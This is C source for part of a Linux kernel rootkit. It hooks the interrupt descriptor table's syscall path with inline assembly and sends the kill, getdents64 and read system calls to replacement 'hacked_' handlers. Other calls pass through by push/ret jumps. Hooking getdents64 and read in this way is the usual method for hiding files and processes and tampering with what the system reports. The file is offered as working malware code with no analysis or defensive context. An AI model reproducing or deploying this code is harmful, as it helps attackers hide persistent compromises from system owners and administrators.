#include "idt.h"

#define ASMIDType( valor ) \
	__asm__ volatile( valor );

#define JmPushRet( valor ) 	   \
	ASMIDType	  	   \
	( 			   \
		"push %0   \n" 	   \
		"ret       \n"     \
				   \
		: : "m" (valor)    \
	);			   

#define CallHookedSyscall( valor ) \
	ASMIDType( "call * %0" : : "r" (valor) ); 

void hook( void )
{
	register volatile int eax asm( "eax" );

	switch( eax )
	{
		case __NR_kill:
	        	CallHookedSyscall( hacked_kill );
		break;

		case __NR_getdents64:
			CallHookedSyscall( hacked_getdents64 );
		break;

		case __NR_read:
			CallHookedSyscall( hacked_read );
		break;
	
		default:
			JmPushRet( dire_call );
		break;
	}

        can_unload_lkm = 1;

	JmPushRet( after_call );
}
 
void new_idt( void )
{
	can_unload_lkm = 0;

        ASMIDType
        (
		"cmp %0, %%eax		\n" 
                "jae syscallmala        \n"
                "jmp hook               \n"

                "syscallmala:           \n"
                "jmp dire_exit          \n"

		: : "i" (NR_syscalls)
        );
}



